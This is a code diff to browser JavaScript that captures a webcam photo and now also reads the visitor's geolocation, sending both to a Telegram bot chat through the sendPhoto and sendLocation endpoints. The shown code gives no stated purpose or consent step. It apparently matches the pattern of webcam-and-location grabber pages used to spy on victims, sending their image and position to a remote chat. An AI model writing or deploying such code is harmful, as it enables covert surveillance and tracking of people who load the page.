@@ -1,4 +1,4 @@
-async function sendPhotoToTelegram(photoBlob) {
+async function sendPhotoAndLocationToTelegram(photoBlob, latitude, longitude) {
   const formData = new FormData();
   formData.append("photo", photoBlob, "webcam.jpg");
 
@@ -9,14 +9,23 @@ async function sendPhotoToTelegram(photoBlob) {
   const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
 
   try {
-    const response = await fetch(telegramApiUrl, {
+    // Send photo
+    const photoResponse = await fetch(telegramApiUrl, {
       method: "POST",
       body: formData
     });
-    const data = await response.json();
-    console.log(data);
+    const photoData = await photoResponse.json();
+    console.log(photoData);
+
+    // Send location
+    const locationApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+    const locationResponse = await fetch(locationApiUrl, {
+      method: "POST"
+    });
+    const locationData = await locationResponse.json();
+    console.log(locationData);
   } catch (error) {
-    console.error("Error sending photo to Telegram:", error);
+    console.error("Error sending photo or location to Telegram:", error);
   }
 }
 
@@ -28,7 +37,18 @@ async function capturePhoto() {
   const context = canvas.getContext("2d");
   context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  canvas.toBlob(sendPhotoToTelegram, "image/jpeg");
+  canvas.toBlob(async (photoBlob) => {
+    // Get location
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude } = position.coords;
+        sendPhotoAndLocationToTelegram(photoBlob, latitude, longitude);
+      },
+      (error) => {
+        console.error("Error getting location:", error);
+      }
+    );
+  }, "image/jpeg");
 }
 
 function startWebcam() {
